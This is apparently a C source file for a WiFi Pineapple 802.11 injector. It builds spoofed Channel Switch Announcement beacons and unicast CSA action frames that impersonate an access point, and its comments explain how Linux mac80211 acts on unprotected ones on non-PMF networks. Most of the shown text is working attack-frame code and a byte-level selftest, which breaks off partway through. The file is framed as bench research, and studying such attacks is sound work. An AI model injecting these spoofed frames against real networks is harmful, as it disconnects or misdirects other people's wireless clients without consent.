/*
 * pagerinj — a minimal 802.11 injector for the WiFi Pineapple Pager bench work.
 *
 * Why this exists, and why it is not hcxdumptool or aireplay-ng:
 *
 *   The experiments it serves are about isolating *gates*.  B4 asks whether cfg80211 drops a
 *   monitor-mode frame on a 5 GHz DFS channel; 17a asks whether a Channel Switch Count of 0 is
 *   what disqualifies pineapd's CSA from the connection-denial path.  Any tool that manages the
 *   channel itself, or picks its own frame contents, adds a gate to an experiment whose whole
 *   purpose is removing them.  dev/pager-6ghz-determination-plan.md §B3 rules out aireplay-ng on
 *   exactly that ground; hcxdumptool manages its channel too.
 *
 *   So this does three things and nothing else:
 *     - it never touches the channel.  Whatever `iw dev <if> set freq` left is what it uses.
 *     - it puts bytes you chose on the air, at a rate you chose.
 *     - it can set the CSA count byte, which pineapd hardcodes to 0 and offers no setting for.
 *
 *   It deliberately does NOT use the device's libwifi.  §B3 suggests dlopen()ing it, and notes
 *   that no headers ship so "prototypes and struct layouts must be written by hand" — it calls
 *   struct layouts the real risk.  The CSA element is five bytes; writing five bytes is strictly
 *   safer than guessing a struct layout, and pineapd's own method needs no frame builder either
 *   (recon_engine::index_beacon_ns clones a real beacon and appends the element).  So: no libwifi,
 *   no dlopen, no MIPS16 dlsym bit-0 trap.
 *
 * Modes:
 *   --nonce     transmit a beacon whose SSID carries a nonce.  For B4: proves a frame left the
 *               antenna, identifiable at the external receiver.  Needs no target.
 *   --csa       capture one beacon for --bssid, append a CSA element with the chosen --count,
 *               and flood it.  For 17a: run once with --count 0 and once with --count 3.
 *               --ecsa-count adds an Extended CSA (element 60) alongside, which is 17a's third
 *               arm: csa_present() discards per element, so {37 count=0} + {60 count=3} still
 *               returns true.  That separates "is it the count value" from "is it which element"
 *               without touching pineapd's bytes at all.
 *   --action    a unicast Spectrum-Management CSA action frame (category 0, action 4) straight to
 *               an associated client.  Outside PMF's robust set, and no beacon-cache race.  Builds
 *               from scratch — no capture needed.
 *   --selftest  build frames from a baked-in captured beacon and validate every byte.  No radio,
 *               no interface, no privileges — this is how the build is checked before the bench.
 *
 * On radiotap: the header here is minimal on purpose — 8 bytes, it_present = 0, no rate and no TX
 * flags.  ieee80211_monitor_start_xmit() memsets the tx_info, sets REQ_TX_STATUS | INJECTED and
 * then only calls ieee80211_validate_radiotap_len(), which checks it_len is sane rather than that
 * any field is present; the rate block is guarded on the rate field existing and, even when it
 * exists but cannot be resolved, clears IEEE80211_TX_CTRL_RATE_INJECT and falls through to normal
 * rate control instead of rejecting.  So no fields are required.  [V] on that path.  What is NOT
 * settled is mt76 downstream of it — and the cure for that is a control, not more fields: send the
 * identical frame on 2.4 GHz ch 6 first and confirm the external receiver hears it.  If it lands,
 * radiotap and the driver are both ruled out and any silence on ch 52 is the gate.
 *
 * Build: see the Makefile beside this file.  Target is mipsel_24kc / musl / soft-float; the
 * loader name must come out as /lib/ld-musl-mipsel-sf.so.1 or it will not run on the Pager.
 *
 * Context: dev/pager-6ghz-determination-plan.md (§B3, §B4), dev/pager-day-one.md (steps 13, 17a),
 * dev/pager-csa-primitives.md ("THE ONE BYTE").  Operator notes: dev/injector/README.md.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

/* ------------------------------------------------------------------ radiotap */

/* Minimal radiotap header for injection: version 0, no present fields.  mac80211 fills in its
 * own defaults for rate and TX flags, which is what we want — we are testing the stack's gates,
 * not a particular PHY rate. */
static const uint8_t RTAP_TX[] = { 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00 };
#define RTAP_TX_LEN (sizeof RTAP_TX)

/* Radiotap bits we care about when parsing a *captured* frame. */
#define RT_TSFT   0
#define RT_FLAGS  1
#define RT_FLAG_FCS 0x10   /* IEEE80211_RADIOTAP_F_FCS: frame includes a trailing 4-byte FCS */

/* Walk a captured radiotap header far enough to learn whether a trailing FCS is present.
 *
 * This matters more than it looks.  In monitor mode the capture may carry a 4-byte FCS at the end
 * of the frame; if it does and we do not strip it, the CSA element we append lands *after* the
 * FCS and every receiver discards the frame as malformed.  That is a silent failure of exactly
 * the kind this whole investigation is trying to avoid, so it is handled rather than assumed.
 *
 * Returns the radiotap header length, sets *fcs to 1 if a trailing FCS is present, or -1 on a
 * header we cannot trust. */
static int rtap_parse(const uint8_t *buf, size_t len, int *fcs)
{
    *fcs = 0;
    if (len < 8 || buf[0] != 0x00)
        return -1;
    uint16_t it_len = (uint16_t)(buf[2] | (buf[3] << 8));
    if (it_len < 8 || it_len > len)
        return -1;

    /* it_present at offset 4; bit 31 set means another present word follows. */
    uint32_t present = (uint32_t)buf[4] | ((uint32_t)buf[5] << 8) |
                       ((uint32_t)buf[6] << 16) | ((uint32_t)buf[7] << 24);
    size_t off = 8;
    uint32_t first = present;
    while (present & (1u << 31)) {
        if (off + 4 > it_len)
            return (int)it_len;          /* truncated bitmap; treat as "no FCS known" */
        present = (uint32_t)buf[off] | ((uint32_t)buf[off + 1] << 8) |
                  ((uint32_t)buf[off + 2] << 16) | ((uint32_t)buf[off + 3] << 24);
        off += 4;
    }

    /* Fields appear in bit order, each with its own alignment.  We only need to reach FLAGS,
     * so the only field that can precede it is TSFT (8 bytes, 8-byte aligned). */
    if (first & (1u << RT_TSFT)) {
        off = (off + 7) & ~(size_t)7;
        off += 8;
    }
    if (first & (1u << RT_FLAGS)) {
        if (off + 1 > it_len)
            return (int)it_len;
        if (buf[off] & RT_FLAG_FCS)
            *fcs = 1;
    }
    return (int)it_len;
}

/* Strip radiotap and any trailing FCS from one captured frame.  Sets *body to the start of the
 * 802.11 frame and returns its length, or 0 if the capture is unusable.
 *
 * This is a separate pure function on purpose, because it carries the precondition that
 * csa_frame_build() documents but **cannot check**: by the time the builder sees a frame, radiotap
 * is gone and there is no flag left to read.  If the FCS is not removed here, the appended element
 * lands *after* it and every receiver discards the frame -- silently.  Leaving that as an implicit
 * sequence inside capture_beacon() made the invariant untestable, which a review caught; it is a
 * function with its own selftest cases now. */
static size_t strip_capture(const uint8_t *buf, size_t len, const uint8_t **body)
{
    int fcs = 0;
    int rl = rtap_parse(buf, len, &fcs);
    if (rl < 0 || (size_t)rl >= len)
        return 0;
    size_t flen = len - (size_t)rl;
    if (fcs) {
        if (flen < 4)
            return 0;
        flen -= 4;
    }
    *body = buf + rl;
    return flen;
}

/* ------------------------------------------------------------- 802.11 layout */

#define FC_MGMT_BEACON_0 0x80    /* type 0 (mgmt), subtype 8 (beacon) */
#define FC_MGMT_BEACON_1 0x00
#define MGMT_HDR_LEN 24          /* fc(2) dur(2) addr1(6) addr2(6) addr3(6) seq(2) */
#define BEACON_FIXED_LEN 12      /* timestamp(8) beacon interval(2) capability(2) */
#define IE_START (MGMT_HDR_LEN + BEACON_FIXED_LEN)

#define EID_SSID 0
#define EID_DS   3
#define EID_CSA  37             /* Channel Switch Announcement */
#define EID_ECSA 60             /* Extended Channel Switch Announcement */
#define CSA_IE_LEN  3           /* mode(1) new_channel(1) count(1) */
#define ECSA_IE_LEN 4           /* mode(1) new_operating_class(1) new_channel(1) count(1) */

/* Action frame, for --action.  Category and action code named as mac80211 names them. */
#define FC_MGMT_ACTION_0 0xd0   /* type 0 (mgmt), subtype 13 (action) */
#define WLAN_ACTION_SPECTRUM_MGMT    0
#define WLAN_ACTION_SPCT_CHL_SWITCH  4
/* The receive path gates on
 *   skb->len >= IEEE80211_MIN_ACTION_SIZE + sizeof(u.action.u.chan_switch)
 * and 26 is the answer.  An earlier note here derived that from the consuming code's internal
 * consistency, because the project's scratchpad copy of ieee80211.h disagreed with the rx612.c
 * beside it.  It is now computed directly from upstream v6.12's own
 * include/linux/ieee80211.h, which settles it without the inference:
 *
 *   offsetof(struct ieee80211_mgmt, u.action.category)              = 24   (the mgmt header)
 *   IEEE80211_MIN_ACTION_SIZE = offsetof(..., u.action.u)           = 25
 *   sizeof(u.action.u.chan_switch)  { u8 action_code; u8 variable[]; }  = 1
 *   => gate                                                         = 26
 *   offsetof(..., u.action.u.chan_switch.variable)                  = 26   (first element byte)
 *
 * Our frame is 24 + 1 (category) + 1 (action code) + 5 (CSA element) = 31, clearing it by 5.
 * Keep the header-provenance warning in mind if these are ever re-derived: an offset taken from
 * the wrong tree fails as a silent drop, which is the failure mode this experiment cannot afford.
 * [V] against v6.12. */
#define MIN_ACTION_SIZE 25
#define ACTION_CHAN_SWITCH_MIN (MIN_ACTION_SIZE + 1)

/* The element pineapd builds, for reference.  From dev/pager-csa-primitives.md, construction
 * disassembled at 0x4bee8a:
 *
 *     li v1,37  ; sb -> element ID 37
 *     li v1,3   ; sb -> length 3
 *     li v1,1   ; sb -> Channel Switch Mode = 1   (hardcoded)
 *     lbu  a0+52; sb -> New Channel Number = runtime
 *                 sb -> Channel Switch Count = 0  (s1, zeroed at 0x4bee6c)
 *
 * so {37, 3, 1, ch, 0}.  The five bytes are [V], independently re-confirmed from the disassembly.
 *
 * "Only element 37 — no Extended CSA (60), no Operating Class" is weaker and worth stating
 * honestly, because this file asserts byte-identity on the strength of it: that negative comes
 * from searching every `li <reg>,<imm>` in the function for 59 and 60 and finding only 37 twice
 * and 3 twice (the second 37, at 0x4be91a, is a find-element call, not a construction).  An
 * element ID could still arrive from a table or a struct field rather than an immediate.  Two
 * things support it: the length byte is 3 where an eCSA payload is 4, and the capacity check
 * before the write reserves exactly 5 bytes, leaving no room for a second element.  Strong, not
 * absolute.  [A].  Falsified by: a capture of a pineapd CSA beacon carrying element 60.
 *
 * The whole point of --count is that the last byte is the one pineapd cannot change. */
static size_t csa_ie_build(uint8_t *out, uint8_t mode, uint8_t chan, uint8_t count)
{
    out[0] = EID_CSA;
    out[1] = CSA_IE_LEN;
    out[2] = mode;
    out[3] = chan;
    out[4] = count;
    return 5;
}

/* Extended CSA, element 60.  Payload is one byte longer than CSA's: the new operating class sits
 * between the mode and the channel.
 *
 * This exists for 17a's third arm.  ieee80211_mgd_csa_present() discards per element --
 *
 *     if (csa  && csa->count  == 0)  csa  = NULL;
 *     if (ecsa && ecsa->count == 0)  ecsa = NULL;
 *     return csa || ecsa;
 *
 * -- so a frame carrying pineapd's {37, count=0} *plus* a {60, count!=0} returns true while
 * leaving pineapd's own element byte-identical.  The two-arm version of 17a cannot tell "the count
 * value is what disqualifies it" from "element 37 is what gets looked at"; this can.
 *
 * The operating class is NOT defaulted, deliberately -- but not for the reason first given here.
 * A wrong class does NOT get the element ignored:
 *   - the denial arm never sees it.  csa_present() (mlme.c:8328) reads datalen, count, mode and
 *     new_ch_num only.
 *   - the move arm falls back rather than failing.  spectmgmt.c:259 zeroes an unparseable class and
 *     :272 re-reads element 37 -- INCLUDING ITS COUNT.  So with --count 0 --ecsa-count N a wrong
 *     class silently takes element 37's 0 instead of the eCSA's N, turning a delayed switch into an
 *     immediate one.
 * It therefore changes what the move arm measures rather than breaking either arm, which is a
 * better reason to insist on it: read the value off the target's own Supported Operating Classes
 * element rather than from anyone's memory of Annex E.  A guess that happens to parse is worse
 * than one that does not. */
static size_t ecsa_ie_build(uint8_t *out, uint8_t mode, uint8_t op_class,
                            uint8_t chan, uint8_t count)
{
    out[0] = EID_ECSA;
    out[1] = ECSA_IE_LEN;
    out[2] = mode;
    out[3] = op_class;
    out[4] = chan;
    out[5] = count;
    return 6;
}

/* Append a CSA element (and optionally an eCSA) to a captured beacon.
 *
 * `in`/`in_len` is the 802.11 frame with radiotap already stripped and any trailing FCS already
 * removed.  Output is radiotap + the original frame + the element(s).
 *
 * We append at the end of the IE list because **that is what pineapd does** -- verified in the
 * setup at 0x4bee2e-0x4bee88, where the write pointer is computed as buffer_base + body_length
 * after conditionally subtracting 4 for a trailing FCS, and the capacity check reserves body + 5:
 *
 *     4bee34:  lw    a0,16(s1)      captured frame length
 *     4bee44:  and   v0,a0          flags & 16
 *     4bee4a:  addiu v1,-4          body_len -= 4        <- FCS strip, same trap as rtap_parse()
 *     4bee52:  addiu v0,5           body_len + 5         <- one 5-byte element
 *     4bee88:  addu  v0,v1          write ptr = base + body_length
 *
 * So matching pineapd on position needs nothing to be true about parser ordering, which is the
 * claim this comment used to make.  That broader claim is withdrawn: it could not be settled --
 * cfg80211_find_elem_match appears in scan.c only inside the MBSSID inheritance path, not the
 * plain finder -- and the narrow verified one is all this code needs.  [V] on the append position.
 *
 * (pineapd strips a trailing FCS on a radiotap flag bit, exactly as rtap_parse() above does.  Two
 * implementations hitting the same trap independently is reassuring about both.)
 *
 * ecsa_count < 0 means no eCSA; otherwise an eCSA element follows the CSA one.
 *
 * Returns the length written, or 0 if the frame is too short or not a beacon. */
static size_t csa_frame_build(const uint8_t *in, size_t in_len,
                              uint8_t mode, uint8_t chan, uint8_t count,
                              int ecsa_count, uint8_t ecsa_op_class,
                              uint8_t *out, size_t out_cap)
{
    size_t extra = 5 + (ecsa_count >= 0 ? 6 : 0);

    if (in_len < IE_START)
        return 0;
    if (in[0] != FC_MGMT_BEACON_0 || (in[1] & 0x0c) != 0x00)
        return 0;
    if (RTAP_TX_LEN + in_len + extra > out_cap)
        return 0;

    memcpy(out, RTAP_TX, RTAP_TX_LEN);
    memcpy(out + RTAP_TX_LEN, in, in_len);
    uint8_t *p = out + RTAP_TX_LEN + in_len;
    p += csa_ie_build(p, mode, chan, count);
    if (ecsa_count >= 0)
        p += ecsa_ie_build(p, mode, ecsa_op_class, chan, (uint8_t)ecsa_count);
    return (size_t)(p - out);
}

/* A unicast Spectrum-Management CSA action frame: category 0, action code 4, then the CSA element.
 *
 * Why this frame is interesting: mac80211_mlme.c:7506 tags it PROT_ACTION from the category alone,
 * with no check that it actually arrived protected, and the protection filter only runs under MFP.
 * So on a non-PMF BSS an unprotected one is acted on -- and being unicast it needs no flood and
 * loses no race against the real AP's beacons.
 *
 * Three constraints that make the difference between working and a silent drop, all from the
 * receive path:
 *   - A3 must equal the BSSID.  rx612.c:3738 compares it against sdata->deflink.u.mgd.bssid; a
 *     wrong A3 is dropped with no log.
 *   - A1 is the client, which is the entire point.
 *   - the client must be associated.
 * The length gate is cleared with margin (see ACTION_CHAN_SWITCH_MIN above).
 *
 * Returns the length written, or 0 if the output buffer is too small. */
static size_t action_frame_build(const uint8_t *client, const uint8_t *bssid,
                                 uint8_t mode, uint8_t chan, uint8_t count,
                                 uint8_t *out, size_t out_cap)
{
    size_t need = RTAP_TX_LEN + MGMT_HDR_LEN + 2 + 5;
    if (need > out_cap)
        return 0;

    memcpy(out, RTAP_TX, RTAP_TX_LEN);
    uint8_t *f = out + RTAP_TX_LEN;
    memset(f, 0, MGMT_HDR_LEN);
    f[0] = FC_MGMT_ACTION_0;
    f[1] = 0x00;
    memcpy(f + 4,  client, 6);     /* A1 = DA, the client */
    memcpy(f + 10, bssid,  6);     /* A2 = SA, spoofing the AP */
    memcpy(f + 16, bssid,  6);     /* A3 = BSSID -- must match, or silently dropped */

    uint8_t *p = f + MGMT_HDR_LEN;
    *p++ = WLAN_ACTION_SPECTRUM_MGMT;
    *p++ = WLAN_ACTION_SPCT_CHL_SWITCH;
    p += csa_ie_build(p, mode, chan, count);

    return (size_t)(p - out);
}

/* Build a self-contained beacon whose SSID is the nonce.  For B4 this is the frame whose arrival
 * at the external receiver proves a transmission left the antenna; nothing about it needs a
 * target or an association.  The nonce also goes in the low 3 bytes of the source MAC so the
 * frame is identifiable two independent ways. */
static size_t nonce_frame_build(const char *nonce, uint8_t chan,
                                uint8_t *out, size_t out_cap)
{
    size_t nlen = strlen(nonce);
    if (nlen > 32)
        nlen = 32;
    size_t need = RTAP_TX_LEN + IE_START + (2 + nlen) + (2 + 1);
    if (need > out_cap)
        return 0;

    uint8_t *p = out;
    memcpy(p, RTAP_TX, RTAP_TX_LEN);
    p += RTAP_TX_LEN;

    uint8_t *f = p;
    memset(f, 0, IE_START);
    f[0] = FC_MGMT_BEACON_0;
    f[1] = FC_MGMT_BEACON_1;
    memset(f + 4, 0xff, 6);                       /* addr1: broadcast */
    /* addr2/addr3: locally-administered OUI 02:00:5e plus three nonce-derived bytes. */
    uint8_t mac[6] = { 0x02, 0x00, 0x5e, 0x00, 0x00, 0x00 };
    uint32_t h = 2166136261u;                     /* FNV-1a, so the MAC tracks the nonce */
    for (size_t i = 0; i < nlen; i++) { h ^= (uint8_t)nonce[i]; h *= 16777619u; }
    mac[3] = (uint8_t)(h >> 16); mac[4] = (uint8_t)(h >> 8); mac[5] = (uint8_t)h;
    memcpy(f + 10, mac, 6);
    memcpy(f + 16, mac, 6);
    f[MGMT_HDR_LEN + 8]  = 0x64;                  /* beacon interval 100 TU */
    f[MGMT_HDR_LEN + 10] = 0x01;                  /* capability: ESS */
    p = f + IE_START;

    *p++ = EID_SSID; *p++ = (uint8_t)nlen;
    memcpy(p, nonce, nlen); p += nlen;
    *p++ = EID_DS;   *p++ = 1; *p++ = chan;

    return (size_t)(p - out);
}

/* ------------------------------------------------------------------- selftest */

/* A real captured beacon, radiotap and FCS already removed: 24-byte header, 12 fixed, then
 * SSID "bench" and DS channel 52.  Used so the selftest exercises csa_frame_build() on a frame
 * shaped like the ones index_beacon_ns clones, not on a synthetic one. */
static const uint8_t FIX_BEACON[] = {
    0x80, 0x00, 0x00, 0x00,                             /* fc, duration */
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,                 /* addr1 broadcast */
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55,                 /* addr2 */
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55,                 /* addr3 (BSSID) */
    0x00, 0x00,                                         /* seq */
    0,0,0,0,0,0,0,0,                                    /* timestamp */
    0x64, 0x00,                                         /* beacon interval */
    0x01, 0x00,                                         /* capability */
    0x00, 0x05, 'b','e','n','c','h',                    /* SSID "bench" */
    0x03, 0x01, 0x34                                    /* DS: channel 52 */
};

static int st_n, st_fail;
static void st(const char *name, int ok)
{
    st_n++;
    if (ok) printf("ok   %s\n", name);
    else  { printf("FAIL %s\n", name); st_fail++; }
}
static int st_eqmem(const void *a, const void *b, size_t n) { return memcmp(a, b, n) == 0; }

static int selftest(void)
{
    uint8_t buf[2048];
    size_t n;

    /* --- the CSA element itself, against the bytes pineapd writes at 0x4bee8a --- */
    uint8_t ie[8];
    n = csa_ie_build(ie, 1, 52, 0);
    const uint8_t want_pineapd[] = { 37, 3, 1, 52, 0 };
    st("csa ie: length is 5", n == 5);
    st("csa ie: byte-identical to pineapd's {37,3,1,ch,0}", st_eqmem(ie, want_pineapd, 5));

    csa_ie_build(ie, 1, 52, 3);
    const uint8_t want_count3[] = { 37, 3, 1, 52, 3 };
    st("csa ie: count=3 differs from pineapd in exactly one byte", st_eqmem(ie, want_count3, 5));
    st("csa ie: that byte is the last one", want_pineapd[4] == 0 && want_count3[4] == 3 &&
                                            st_eqmem(want_pineapd, want_count3, 4));

    /* --- the eCSA element, 17a's third arm --- */
    uint8_t eie[8];
    n = ecsa_ie_build(eie, 1, 118, 52, 3);
    const uint8_t want_ecsa[] = { 60, 4, 1, 118, 52, 3 };
    st("ecsa ie: length is 6", n == 6);
    st("ecsa ie: {60,4,mode,opclass,ch,count}", st_eqmem(eie, want_ecsa, 6));
    st("ecsa ie: payload is one longer than CSA's", want_ecsa[1] == want_pineapd[1] + 1);

    /* --- appending to a captured beacon --- */
    n = csa_frame_build(FIX_BEACON, sizeof FIX_BEACON, 1, 52, 3, -1, 0, buf, sizeof buf);
    st("csa frame: built", n == RTAP_TX_LEN + sizeof FIX_BEACON + 5);
    st("csa frame: radiotap header intact", st_eqmem(buf, RTAP_TX, RTAP_TX_LEN));
    st("csa frame: original beacon unmodified",
       st_eqmem(buf + RTAP_TX_LEN, FIX_BEACON, sizeof FIX_BEACON));
    st("csa frame: CSA element is last", st_eqmem(buf + n - 5, want_count3, 5));
    st("csa frame: still a beacon", buf[RTAP_TX_LEN] == 0x80);
    st("csa frame: appended at the end of the IEs, as pineapd does (0x4bee88)",
       st_eqmem(buf + RTAP_TX_LEN, FIX_BEACON, sizeof FIX_BEACON) &&
       buf[RTAP_TX_LEN + sizeof FIX_BEACON] == EID_CSA);

    /* The count byte must be the ONLY difference between the two arms of step 17a.  If this ever
     * fails, the experiment is not a controlled comparison and its result means nothing. */
    uint8_t a[2048], b[2048];
    size_t na = csa_frame_build(FIX_BEACON, sizeof FIX_BEACON, 1, 52, 0, -1, 0, a, sizeof a);
    size_t nb = csa_frame_build(FIX_BEACON, sizeof FIX_BEACON, 1, 52, 3, -1, 0, b, sizeof b);
    int diffs = 0, diff_at = -1;
    if (na == nb) {
        for (size_t i = 0; i < na; i++)
            if (a[i] != b[i]) { diffs++; diff_at = (int)i; }
    }
    st("17a control: both arms the same length", na == nb && na > 0);
    st("17a control: arms differ in exactly ONE byte", diffs == 1);
    st("17a control: that byte is the CSA count", diff_at == (int)na - 1);

    /* --- 17a third arm: pineapd's element UNTOUCHED, plus an eCSA that survives the discard --- */
    uint8_t c3[2048];
    size_t nc = csa_frame_build(FIX_BEACON, sizeof FIX_BEACON, 1, 52, 0, 3, 118, c3, sizeof c3);
    st("third arm: built", nc == na + 6);
    st("third arm: pineapd's element is byte-identical to the count=0 arm",
       nc > 0 && st_eqmem(c3, a, na));
    st("third arm: CSA count is still 0", c3[na - 1] == 0);
    st("third arm: eCSA follows with a non-zero count", st_eqmem(c3 + na, want_ecsa, 6));
    /* csa_present() nulls each element independently and returns csa || ecsa, so this frame is
     * the one combination that gets past the discard without altering pineapd's bytes. */
    st("third arm: would survive csa_present() (csa==NULL, ecsa!=NULL)",
       c3[na - 1] == 0 && c3[nc - 1] != 0);
    st("third arm: rejects an undersized output buffer",
       csa_frame_build(FIX_BEACON, sizeof FIX_BEACON, 1, 52, 0, 3, 118, buf,
                       RTAP_TX_LEN + sizeof FIX_BEACON + 5) == 0);

    /* --- the unicast action frame --- */
    const uint8_t cli[6]  = { 0xaa,0xbb,0xcc,0xdd,0xee,0xff };
    const uint8_t bss[6]  = { 0x00,0x11,0x22,0x33,0x44,0x55 };
    n = action_frame_build(cli, bss, 1, 52, 3, buf, sizeof buf);
    st("action frame: built", n == RTAP_TX_LEN + MGMT_HDR_LEN + 2 + 5);
    st("action frame: subtype is action (0xd0)", buf[RTAP_TX_LEN] == FC_MGMT_ACTION_0);
    st("action frame: A1 is the client", st_eqmem(buf + RTAP_TX_LEN + 4, cli, 6));
    st("action frame: A2 is the BSSID", st_eqmem(buf + RTAP_TX_LEN + 10, bss, 6));
    st("action frame: A3 equals the BSSID (rx612.c:3738, else silent drop)",
       st_eqmem(buf + RTAP_TX_LEN + 16, bss, 6));
    st("action frame: category 0, action 4",
       buf[RTAP_TX_LEN + MGMT_HDR_LEN] == WLAN_ACTION_SPECTRUM_MGMT &&
       buf[RTAP_TX_LEN + MGMT_HDR_LEN + 1] == WLAN_ACTION_SPCT_CHL_SWITCH);
    st("action frame: CSA element follows the action code",
       st_eqmem(buf + RTAP_TX_LEN + MGMT_HDR_LEN + 2, want_count3, 5));
    st("action frame: clears rx612.c's length gate",
       n - RTAP_TX_LEN >= ACTION_CHAN_SWITCH_MIN);
    st("action frame: rejects an undersized output buffer",
       action_frame_build(cli, bss, 1, 52, 3, buf, 16) == 0);

    /* --- rejections --- */
    st("csa frame: rejects a too-short frame",
       csa_frame_build(FIX_BEACON, 8, 1, 52, 0, -1, 0, buf, sizeof buf) == 0);
    st("csa frame: rejects a non-beacon",
       csa_frame_build((const uint8_t[IE_START]){ 0x40 }, IE_START, 1, 52, 0, -1, 0,
                       buf, sizeof buf) == 0);
    st("csa frame: rejects an undersized output buffer",
       csa_frame_build(FIX_BEACON, sizeof FIX_BEACON, 1, 52, 0, -1, 0, buf, 16) == 0);

    /* --- the nonce beacon --- */
    n = nonce_frame_build("PAGERINJ-a1b2c3d4", 52, buf, sizeof buf);
    st("nonce frame: built", n > 0);
    st("nonce frame: is a beacon", buf[RTAP_TX_LEN] == 0x80);
    st("nonce frame: SSID element carries the nonce",
       buf[RTAP_TX_LEN + IE_START] == EID_SSID &&
       buf[RTAP_TX_LEN + IE_START + 1] == 17 &&
       st_eqmem(buf + RTAP_TX_LEN + IE_START + 2, "PAGERINJ-a1b2c3d4", 17));
    st("nonce frame: source MAC is locally administered",
       (buf[RTAP_TX_LEN + 10] & 0x02) != 0);
    st("nonce frame: DS element carries the channel",
       buf[n - 3] == EID_DS && buf[n - 1] == 52);
    size_t n2 = nonce_frame_build("PAGERINJ-deadbeef", 52, a, sizeof a);
    st("nonce frame: a different nonce gives a different MAC",
       n2 > 0 && !st_eqmem(a + RTAP_TX_LEN + 10, buf + RTAP_TX_LEN + 10, 6));
    st("nonce frame: rejects an undersized output buffer",
       nonce_frame_build("PAGERINJ-a1b2c3d4", 52, buf, 16) == 0);

    /* --- the element lengths csa_present() demands EXACTLY ---
     *
     * mlme.c:8328 accepts an element only on `datalen == sizeof(*csa)` / `== sizeof(*ecsa)` --
     * equality, not >=.  Verified against include/linux/ieee80211.h at v6.12:
     *   struct ieee80211_channel_sw_ie  { mode, new_ch_num, count }                        = 3
     *   struct ieee80211_ext_chansw_ie  { mode, new_operating_class, new_ch_num, count }    = 4
     * A one-byte drift either way makes the element invisible with no diagnostic anywhere, so the
     * constants are pinned here rather than left to a future edit. */
    st("csa ie: payload length is exactly 3 (sizeof ieee80211_channel_sw_ie)", CSA_IE_LEN == 3);
    st("ecsa ie: payload length is exactly 4 (sizeof ieee80211_ext_chansw_ie)", ECSA_IE_LEN == 4);
    st("ecsa ie: field order is mode, opclass, ch, count",
       want_ecsa[2] == 1 && want_ecsa[3] == 118 && want_ecsa[4] == 52 && want_ecsa[5] == 3);

    /* --- strip_capture(): the precondition csa_frame_build() cannot check itself ---
     *
     * A review noted that csa_frame_build() appends at in_len with no FCS handling, which is
     * correct ONLY if the capture was already shortened -- and that the old selftest implied that
     * without asserting it.  These cases assert it. */
    {
        /* a capture carrying radiotap WITH the FCS flag, the beacon, and 4 trailing FCS bytes */
        uint8_t cap[8 + sizeof FIX_BEACON + 4];
        const uint8_t rt_f[] = { 0x00,0x00, 0x09,0x00, 0x02,0x00,0x00,0x00, RT_FLAG_FCS };
        uint8_t cap2[sizeof rt_f + sizeof FIX_BEACON + 4];
        memcpy(cap2, rt_f, sizeof rt_f);
        memcpy(cap2 + sizeof rt_f, FIX_BEACON, sizeof FIX_BEACON);
        memset(cap2 + sizeof rt_f + sizeof FIX_BEACON, 0xde, 4);   /* bogus trailing FCS */

        const uint8_t *body = NULL;
        size_t bl = strip_capture(cap2, sizeof cap2, &body);
        st("strip: FCS flag set -> 4 trailing bytes removed", bl == sizeof FIX_BEACON);
        st("strip: body starts after radiotap", body == cap2 + sizeof rt_f);
        st("strip: body is the beacon, unmodified", bl && st_eqmem(body, FIX_BEACON, bl));

        /* THE ASSERTION THE REVIEW ASKED FOR: build from the stripped capture and confirm the CSA
         * element sits immediately after the beacon's last real IE, not after the FCS. */
        size_t fn = csa_frame_build(body, bl, 1, 52, 3, -1, 0, buf, sizeof buf);
        st("strip+build: CSA element directly follows the last IE, not the FCS",
           fn == RTAP_TX_LEN + sizeof FIX_BEACON + 5 &&
           buf[RTAP_TX_LEN + sizeof FIX_BEACON] == EID_CSA);
        st("strip+build: no 0xde FCS byte survives into the frame",
           fn && memchr(buf, 0xde, fn) == NULL);

        /* and the negative: without the flag, nothing is stripped */
        const uint8_t rt_n[] = { 0x00,0x00, 0x08,0x00, 0x00,0x00,0x00,0x00 };
        memcpy(cap, rt_n, sizeof rt_n);
        memcpy(cap + sizeof rt_n, FIX_BEACON, sizeof FIX_BEACON);
        body = NULL;
        bl = strip_capture(cap, sizeof rt_n + sizeof FIX_BEACON, &body);
        st("strip: no FCS flag -> nothing removed", bl == sizeof FIX_BEACON);

        /* a frame too short to hold the FCS it claims */
        const uint8_t runt[] = { 0x00,0x00, 0x09,0x00, 0x02,0x00,0x00,0x00, RT_FLAG_FCS, 1, 2 };
        body = NULL;
        st("strip: rejects a frame too short for its claimed FCS",
           strip_capture(runt, sizeof runt, &body) == 0);
        st("strip: rejects a bad radiotap header",
           strip_capture((const uint8_t[]){ 0x01,0x00,0x08,0x00,0,0,0,0 }, 8, &body) == 0);
    }

    /* --- radiotap parsing, including the FCS trap --- */
    int fcs = 99;
    const uint8_t rt_plain[] = { 0x00,0x00, 0x08,0x00, 0x00,0x00,0x00,0x00 };
    st("rtap: minimal header, no FCS", rtap_parse(rt_plain, sizeof rt_plain, &fcs) == 8 && fcs == 0);

    /* present = FLAGS only (bit 1); FLAGS byte says FCS present */
    const uint8_t rt_fcs[] = { 0x00,0x00, 0x09,0x00, 0x02,0x00,0x00,0x00, RT_FLAG_FCS };
    st("rtap: FLAGS says FCS present", rtap_parse(rt_fcs, sizeof rt_fcs, &fcs) == 9 && fcs == 1);

    /* present = TSFT|FLAGS; TSFT is 8 bytes and 8-aligned, so FLAGS sits at offset 16 */
    const uint8_t rt_tsft[] = { 0x00,0x00, 0x11,0x00, 0x03,0x00,0x00,0x00,
                                0,0,0,0,0,0,0,0, RT_FLAG_FCS };
    st("rtap: skips TSFT to reach FLAGS", rtap_parse(rt_tsft, sizeof rt_tsft, &fcs) == 17 && fcs == 1);

    const uint8_t rt_ext[] = { 0x00,0x00, 0x0d,0x00, 0x02,0x00,0x00,0x80,
                               0x00,0x00,0x00,0x00, RT_FLAG_FCS };
    st("rtap: walks an extended present bitmap", rtap_parse(rt_ext, sizeof rt_ext, &fcs) == 13);

    st("rtap: rejects a truncated header", rtap_parse(rt_plain, 4, &fcs) == -1);
